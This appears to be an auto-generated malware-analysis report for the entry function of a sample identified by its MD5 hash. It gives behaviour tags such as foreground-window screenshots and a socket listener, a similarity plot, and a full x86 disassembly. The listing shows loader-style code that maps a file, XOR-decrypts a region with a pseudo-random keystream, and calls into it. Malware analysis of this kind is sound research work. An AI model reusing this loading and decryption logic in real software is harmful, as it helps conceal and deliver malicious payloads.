---
layout: post
title:  "entry0 @ d287262b3c4caae6c69c406382125319"
date:   2021-09-10 15:52:19 +0300
categories: report
index: false
---

# Generic Information
- **Function:** entry0
- **Origin (md5):** d287262b3c4caae6c69c406382125319
- **VirusTotal:** [virustotal.com/gui/file/d287262b3c4caae6c69c406382125319][virustotal_ref]

# Code Tags
<span class="tag" id="FILE">FILE</span>
<span class="tag" id="MEMORY">MEMORY</span>
<span class="tag" id="PROCESS">PROCESS</span>
<span class="tag" id="LINKING">LINKING</span>


# Behaviour Tags
<span class="bhv-tag" id="SCREENSHOTS_FOREGROUND_WINDOW">SCREENSHOTS_FOREGROUND_WINDOW / 0.08800140888205331</span><span class="bhv-tag" id="CREATES_SOCKET_LISTENER">CREATES_SOCKET_LISTENER / 0.027642519777300326</span>

# Similar Functions
<script type="text/javascript" src="https://www.gstatic.com/charts/loader.js"></script>
<script type="text/javascript">

    google.charts.load('current', {'packages':['corechart']});
    google.charts.setOnLoadCallback(drawChart);

    function drawChart() {
    var data = new google.visualization.DataTable();
        data.addColumn('number', 'X');
        data.addColumn('number', 'Y');
        data.addColumn({type: 'string', role: 'tooltip', 'p': {'html': true}});
        data.addColumn({'type': 'string', 'role': 'style'});
        
        data.addRows([
    [859.7105712890625, 114.18560791015625, '<b><a href="/report/entry0@d287262b3c4caae6c69c406382125319">entry0</a><br>@d287262b3c4caae6c69c406382125319</b><br>', 'point { fill-color: #e0440e; }'],
[-47.813514709472656, 461.3223571777344, '<b><a href="/report/entry0@3a783d6a0e3505903843983e413a529e">entry0</a><br>@3a783d6a0e3505903843983e413a529e</b><br>', 'null'],
[706.5785522460938, 1073.6973876953125, '<b><a href="/report/entry0@57989f43bf24a9272122210a17558c3d">entry0</a><br>@57989f43bf24a9272122210a17558c3d</b><br>', 'null'],

        ]);

    var options = {
        title: 'Similarity Plot',
        legend: 'none',
        colors: ['#dedbd9', '#e6693e', '#ec8f6e', '#f3b49f', '#f6c7b6'],
        tooltip: {isHtml: true, trigger: 'both'},
        explorer: {
        actions: ["dragToZoom", "rightClickToReset"],
        },
        chartArea: {
        width: '80%',
        height: '80%'
        },
        width: '100%',
        height: '100%'
    };

    var chart = new google.visualization.ScatterChart(document.getElementById('chart_div'));

    chart.draw(data, options);
    }
    
</script>


<div id="chart_div" style="width: 100%px; height: 100%;"></div>

# Disassembled Code
{% highlight nasm %}

push ebp
mov ebp, esp
and esp, 0xfffffff8
sub esp, 0x88c
xor ecx, ecx
push ebx
push esi
mov ebx, ecx
push edi
mov dword[esp+0x10], ebx
mov dword[esp+0x4c], ecx
mov dword[esp+0x34], ecx
mov dword[esp+0x2c], ecx
mov dword[esp+0x1c], ecx
mov dword[esp+0x50], ecx
mov dword[esp+0x20], ecx
mov dword[esp+0x54], ecx
call fcn.00402322
mov esi, dword[sym.imp.KERNEL32.dll_GetTickCount]
call esi
and eax, 0x11
mov dword[esp+0x3c], 3
cmp eax, 0x111
je 0x4028f0
call esi
mov dword[0x406040], eax
mov eax, dword[esp+0x20]
mov dword[esp+0x18], eax
mov eax, dword[esp+0x20]
mov dword[esp+0x30], eax
mov eax, dword[esp+0x20]
mov dword[esp+0x24], eax
jmp 0x4029c1
mov eax, dword[esp+0x20]
mov ecx, dword[esp+0x20]
mov dword[esp+0x30], eax
mov eax, dword[esp+0x20]
mov dword[esp+0x18], ecx
mov dword[esp+0x24], eax
mov esi, ebx
push 4
push 0x1000
push ecx
push 0
call dword[sym.imp.KERNEL32.dll_VirtualAlloc]
mov edi, eax
call fcn.00403526
mov ecx, eax
sub ecx, dword[0x406040]
xor edx, edx
mov eax, ecx
div dword[esp+0x3c]
test ecx, 0xffff8000
je 0x40294c
test edx, edx
je 0x403128
cmp edx, 1
je 0x4029c1
mov ecx, dword[esp+0x18]
jmp 0x40290a
mov eax, dword[esp+0x30]
mov dword[esp+0x64], eax
mov eax, dword[esp+0x50]
mov dword[esp+0x60], eax
mov eax, dword[esp+0x18]
lea ecx, [esp+0x60]
mov dword[esp+0x70], eax
mov dword[esp+0x6c], edi
call fcn.00403800
cmp eax, 1
jne 0x403198
push esi
call dword[sym.imp.KERNEL32.dll_UnmapViewOfFile]
push dword[esp+0x2c]
call dword[sym.imp.KERNEL32.dll_CloseHandle]
call fcn.00403526
mov ecx, eax
sub ecx, dword[0x406040]
xor edx, edx
mov eax, ecx
div dword[esp+0x3c]
test ecx, 0xffff8000
je 0x4030da
test edx, edx
je 0x403128
mov ecx, dword[esp+0x18]
cmp edx, 1
jne 0x40290a
mov esi, dword[esp+0x1c]
push 3
pop edi
call fcn.00403526
mov ecx, eax
sub ecx, dword[0x406040]
xor edx, edx
mov eax, ecx
div edi
test ecx, 0xffff8000
jne 0x402e75
push ecx
call fcn.004024e2
call fcn.00403526
mov ecx, eax
sub ecx, dword[0x406040]
xor edx, edx
mov eax, ecx
div edi
test ecx, 0xffff8000
jne 0x402e75
call fcn.0040348a
mov edi, dword[sym.imp.KERNEL32.dll_GetCommandLineW]
push 0x401378
lea esi, [eax+0xfe0]
call edi
push eax
call dword[0x406008]
test eax, eax
setne al
pop ecx
pop ecx
mov byte[esp+0x2b], al
test al, al
je 0x402a66
push 0x401234
call edi
push eax
call dword[0x406008]
pop ecx
pop ecx
test eax, eax
je 0x402a66
mov ecx, esi
mov byte[esp+0x17], 1
call fcn.004031d7
test al, al
je 0x4031a3
xor ecx, ecx
jmp 0x402a7f
xor ecx, ecx
cmp dword[esi], 0x696d7678
mov byte[esp+0x17], cl
jne 0x402a7d
cmp dword[esi+4], 0x74636a6e
je 0x402a7f
mov esi, ecx
test esi, esi
je 0x402cc9
mov ebx, dword[sym.imp.KERNEL32.dll_MapViewOfFile]
push ecx
push ecx
push ecx
push 6
push dword[esi+0x18]
call ebx
mov edi, eax
mov dword[esp+0x10], edi
test edi, edi
je 0x403026
xor eax, eax
push eax
push eax
push eax
push 6
push dword[edi+0x1c]
call ebx
mov ebx, eax
mov dword[esp+0x4c], ebx
test ebx, ebx
je 0x40301b
mov ecx, dword[ebx+0x48]
cmp ecx, 0x3fc
jae 0x403006
mov eax, dword[ebx+0x4c]
add ecx, ecx
push ecx
add eax, ebx
push eax
lea eax, [esp+0xa8]
push eax
call dword[0x406020]
mov eax, dword[ebx+0x48]
xor ecx, ecx
mov word[esp+eax*2+0xac], cx
mov eax, dword[edi+0x40]
xor esi, esi
add esp, 0xc
xor ebx, ebx
mov dword[esp+0x38], esi
test eax, eax
je 0x402b30
cmp dword[edi+0x44], ecx
je 0x402b30
lea eax, [eax*2+2]
push eax
push esi
call dword[sym.imp.KERNEL32.dll_GetProcessHeap]
push eax
call dword[sym.imp.KERNEL32.dll_HeapAlloc]
mov ebx, eax
test ebx, ebx
jne 0x402b3a
push ecx
push 0x401404
jmp 0x40319e
cmp byte[esp+0x17], cl
jne 0x402ffb
mov eax, dword[edi+0x50]
test eax, eax
je 0x402b72
cmp dword[edi+0x54], esi
je 0x402b72
lea eax, [eax*2+2]
push eax
push 0
call dword[sym.imp.KERNEL32.dll_GetProcessHeap]
push eax
call dword[sym.imp.KERNEL32.dll_HeapAlloc]
mov esi, eax
mov dword[esp+0x38], esi
test esi, esi
jne 0x402b7d
push ecx
push 0x40142c
jmp 0x40319e
cmp byte[esp+0x2b], 0
jne 0x402ff0
mov eax, dword
mov eax, dword[eax+0x30]
mov edi, dword[eax+0x10]
test ebx, ebx
je 0x402bbf
mov ecx, dword[esp+0x10]
mov eax, dword[ecx+0x40]
add eax, eax
push eax
mov eax, dword[ecx+0x44]
add eax, ecx
push eax
push ebx
call dword[0x406020]
mov eax, dword[esp+0x1c]
add esp, 0xc
mov eax, dword[eax+0x40]
xor ecx, ecx
mov word[ebx+eax*2], cx
push ebx
lea eax, [edi+0x38]
push eax
call dword[0x406030]
test esi, esi
je 0x402c4f
mov ecx, dword[esp+0x10]
mov eax, dword[ecx+0x50]
add eax, eax
push eax
mov eax, dword[ecx+0x54]
add eax, ecx
push eax
push esi
call dword[0x406020]
mov eax, dword[esp+0x1c]
add esp, 0xc
mov eax, dword[eax+0x50]
push esi
xor ecx, ecx
add edi, 0x40
push edi
mov word[esi+eax*2], cx
call dword[0x406030]
push esi
call dword[sym.imp.KERNEL32.dll_GetCommandLineW]
push eax
call dword[section..data]
pop ecx
pop ecx
call dword[sym.imp.KERNEL32.dll_GetCommandLineA]
mov esi, eax
test esi, esi
je 0x402c4b
push 8
lea eax, [esp+0x5c]
push 0
push eax
call dword[0x40601c]
add esp, 0xc
lea eax, [esp+0x58]
push 1
push edi
push eax
call dword[0x40602c]
test eax, eax
js 0x402c48
push dword[esp+0x5c]
push esi
call dword[0x406010]
pop ecx
pop ecx
jmp 0x402c4b
mov byte[esi], 0
mov esi, dword[esp+0x38]
call fcn.004034cb
test al, al
je 0x402cf1
call fcn.0040348a
mov ecx, dword[eax+0x20]
xor edx, edx
cmp dword[eax+0x24], edx
ja 0x402cf1
jb 0x402c79
cmp ecx, 0x7fff0000
jae 0x402cf1
test ebx, ebx
je 0x402ca1
mov dword[ecx+0x68], ebx
mov ebx, dword[esp+0x10]
mov dword[ecx+0x6c], edx
mov ax, word[ebx+0x40]
add ax, ax
mov word[ecx+0x60], ax
mov ax, word[ebx+0x40]
inc ax
add ax, ax
mov word[ecx+0x62], ax
jmp 0x402ca5
mov ebx, dword[esp+0x10]
test esi, esi
je 0x402cf5
mov dword[ecx+0x78], esi
mov dword[ecx+0x7c], edx
mov ax, word[ebx+0x50]
add ax, ax
mov word[ecx+0x70], ax
mov ax, word[ebx+0x50]
inc ax
add ax, ax
mov word[ecx+0x72], ax
jmp 0x402cf5
mov esi, 0x3fc
push esi
lea eax, [esp+0xa4]
push eax
push ecx
call dword[sym.imp.KERNEL32.dll_GetModuleFileNameW]
test eax, eax
je 0x402ce6
cmp eax, esi
jne 0x402cf5
push ecx
push 0x401454
jmp 0x403147
mov ebx, dword[esp+0x10]
push 0x5c
pop eax
cmp word[esp+0xa0], ax
jne 0x402d15
cmp word[esp+0xa2], ax
jne 0x402d15
lea esi, [esp+0xa0]
jmp 0x402d34
push 8
lea eax, [esp+0x9c]
push 0x401678
push eax
call dword[0x406020]
add esp, 0xc
lea esi, [esp+0x98]
call fcn.00403526
mov ecx, eax
sub ecx, dword[0x406040]
push 3
xor edx, edx
mov eax, ecx
pop edi
div edi
test ecx, 0xffff8000
je 0x402d6c
test edx, edx
je 0x403128
mov esi, dword[esp+0x1c]
cmp edx, 1
jne 0x402946
jmp 0x4029c8
push ecx
push esi
call fcn.0040249a
push ecx
push 0x401468
call fcn.0040249a
xor eax, eax
push eax
push eax
push edi
push eax
push 7
push 0x80000000
push esi
call dword[sym.imp.KERNEL32.dll_CreateFileW]
mov edi, eax
mov dword[esp+0x34], edi
cmp edi, 0xffffffff
je 0x4030d2
call fcn.00403547
mov esi, dword[esp+0x1c]
test eax, eax
jne 0x4029c5
xor eax, eax
push eax
push eax
push eax
push 2
push eax
push edi
call dword[sym.imp.KERNEL32.dll_CreateFileMappingW]
mov dword[esp+0x2c], eax
test eax, eax
je 0x4030ca
push 0x1000
push 0
push 0
push 4
push eax
call dword[sym.imp.KERNEL32.dll_MapViewOfFile]
mov edi, eax
test edi, edi
je 0x4030c2
mov ecx, edi
call fcn.00402537
push edi
mov esi, eax
call dword[sym.imp.KERNEL32.dll_UnmapViewOfFile]
lea eax, [esp+0x40]
push eax
push dword[esp+0x38]
call dword[sym.imp.KERNEL32.dll_GetFileSizeEx]
test eax, eax
je 0x4030b7
xor eax, eax
push eax
mov ecx, esi
add ecx, 0x1000
pop edx
adc eax, edx
cmp dword[esp+0x44], eax
jl 0x403089
jg 0x402e34
cmp dword[esp+0x40], ecx
jbe 0x403089
lea eax, [esi+0x1000]
push eax
push edx
push edx
push 4
push dword[esp+0x3c]
call dword[sym.imp.KERNEL32.dll_MapViewOfFile]
mov esi, eax
mov dword[esp+0x1c], esi
test esi, esi
je 0x40307e
call fcn.00403526
mov ecx, eax
sub ecx, dword[0x406040]
push 3
xor edx, edx
mov eax, ecx
pop edi
div edi
test ecx, 0xffff8000
je 0x402e8b
test edx, edx
je 0x403128
cmp edx, 1
je 0x4029c8
jmp 0x402946
mov ecx, esi
call fcn.00402537
mov esi, eax
add esi, dword[esp+0x1c]
push 4
pop ebx
mov ecx, dword[esi]
add esi, ebx
cmp ecx, 0x6d7678
jne 0x403073
mov ecx, dword[esi]
add esi, ebx
cmp ecx, edi
jne 0x403068
mov edx, dword[esi]
mov edi, edx
imul edi, edi, 0x8088405
add esi, ebx
inc edi
mov ecx, dword[esi]
mov eax, edi
xor eax, edx
add esi, ebx
cmp eax, ecx
jne 0x40305d
mov ecx, dword[esi]
mov edx, edi
imul edx, edx, 0x8088405
inc edx
mov eax, edx
xor eax, edi
add esi, ebx
cmp eax, ecx
jne 0x403052
mov eax, dword[esi]
imul edx, edx, 0x8088405
inc edx
xor eax, edx
imul edx, edx, 0x8088405
add esi, ebx
inc edx
mov ecx, dword[esi]
xor ecx, edx
imul edx, edx, 0x2b9ad7e7
mov dword[esp+0x24], 0x8088406
sub dword[esp+0x24], edx
mov edx, dword[esp+0x24]
xor edx, dword[esi+8]
mov dword[esp+0x18], eax
mov eax, dword[esp+0x1c]
lea ebx, [esi+8]
sub ebx, eax
add ebx, 4
add edx, ebx
add edx, ecx
push eax
mov dword[esp+0x34], ecx
mov dword[esp+0x28], edx
call dword[sym.imp.KERNEL32.dll_UnmapViewOfFile]
push dword[esp+0x2c]
call dword[sym.imp.KERNEL32.dll_CloseHandle]
xor eax, eax
push eax
push eax
push eax
push 8
push eax
push dword[esp+0x48]
call dword[sym.imp.KERNEL32.dll_CreateFileMappingW]
mov ecx, eax
mov dword[esp+0x2c], ecx
test ecx, ecx
je 0x403047
mov eax, dword[esp+0x30]
add eax, ebx
push eax
push 0
push 0
push 1
push ecx
call dword[sym.imp.KERNEL32.dll_MapViewOfFile]
mov esi, eax
mov dword[esp+0x1c], esi
test esi, esi
je 0x40303c
lea eax, [ebx+esi]
mov dword[esp+0x50], eax
mov ecx, eax
mov eax, dword[esp+0x30]
test eax, eax
je 0x402fb7
mov edx, eax
imul edi, edi, 0x343fd
add edi, 0x269ec3
mov eax, edi
shr eax, 0x10
xor byte[ecx], al
inc ecx
dec edx
jne 0x402fa0
xor eax, eax
push ecx
push ecx
lea ecx, [esp+0x68]
mov dword[esp+0x88], eax
mov dword[esp+0x8c], eax
mov dword[esp+0x90], eax
mov dword[esp+0x6c], eax
mov dword[esp+0x68], eax
call fcn.004036e0
pop ecx
pop ecx
test eax, eax
jne 0x403031
mov ebx, dword[esp+0x10]
jmp 0x402946
push ecx
push 0x401440
jmp 0x40319e
push ecx
push 0x401418
jmp 0x40319e
push ecx
push 0x4013f0
call fcn.0040249a
push 0xa
push dword[ebx+0x48]
jmp 0x403155
push ecx
push 0x4013dc
jmp 0x403147
push ecx
push 0x4013c8
jmp 0x403147
push ecx
push 0x401588
jmp 0x40319e
push ecx
push 0x401574
jmp 0x403147
push ecx
push 0x401560
jmp 0x403147
push ecx
push 0x401550
jmp 0x40319e
push ecx
push 0x401540
jmp 0x40319e
push ecx
push 0x401530
jmp 0x40319e
push ecx
push 0x401520
jmp 0x40319e
push ecx
push 0x40150c
jmp 0x403147
push ecx
push 0x4014f8
call fcn.0040249a
push 0xa
push dword[esp+0x44]
mov ecx, 0x406048
call fcn.00402433
push ecx
push 0x401468
call fcn.0040249a
push 0xa
push esi
jmp 0x403155
push ecx
push 0x4014e4
jmp 0x403147
push ecx
push 0x4014d0
jmp 0x403147
push ecx
push 0x4014bc
jmp 0x403147
push ecx
push 0x401470
jmp 0x403147
mov ecx, edi
call fcn.00402617
push 0x8000
push dword[esp+0x1c]
mov esi, eax
push edi
call dword[sym.imp.KERNEL32.dll_VirtualFree]
test esi, esi
je 0x4031a3
mov ecx, esi
call fcn.004034ee
mov ecx, esi
call fcn.0040258e
mov dword[esp+0x20], eax
test eax, eax
jne 0x40311c
push ecx
push 0x4015b0
jmp 0x40319e
push 0
call dword[sym.imp.KERNEL32.dll_GetModuleHandleW]
mov dword[esp+0x54], eax
mov edi, dword[esp+0x34]
xor eax, eax
push eax
push eax
push eax
push 2
push eax
push edi
call dword[sym.imp.KERNEL32.dll_CreateFileMappingW]
mov esi, eax
test esi, esi
jne 0x403161
push ecx
push 0x4015c0
call fcn.0040249a
push 0xa
call dword[sym.imp.KERNEL32.dll_GetLastError]
push eax
mov ecx, 0x406048
call fcn.00402433
jmp 0x4031a3
push edi
call dword[sym.imp.KERNEL32.dll_CloseHandle]
mov eax, dword[esp+0x4c]
push eax
mov eax, dword[esp+0x28]
push ebx
add eax, 0xffff
and eax, 0xffff0000
push eax
push dword[esp+0x50]
push dword[esp+0x50]
push esi
push dword[esp+0x6c]
call dword[esp+0x3c]
add esp, 0x1c
pop edi
pop esi
pop ebx
mov esp, ebp
pop ebp
ret
push ecx
push 0x401598
call fcn.0040249a
push 0x4015d4
push 0x4015e0
call dword[sym.imp.KERNEL32.dll_LoadLibraryW]
push eax
call dword[sym.imp.KERNEL32.dll_GetProcAddress]
push 0x10
push 0x4015f8
push 0x406048
push 0
call eax
push 0xffffffffffffffff
call dword[sym.imp.KERNEL32.dll_ExitProcess]

{% endhighlight %}

[virustotal_ref]: https://www.virustotal.com/gui/file/d287262b3c4caae6c69c406382125319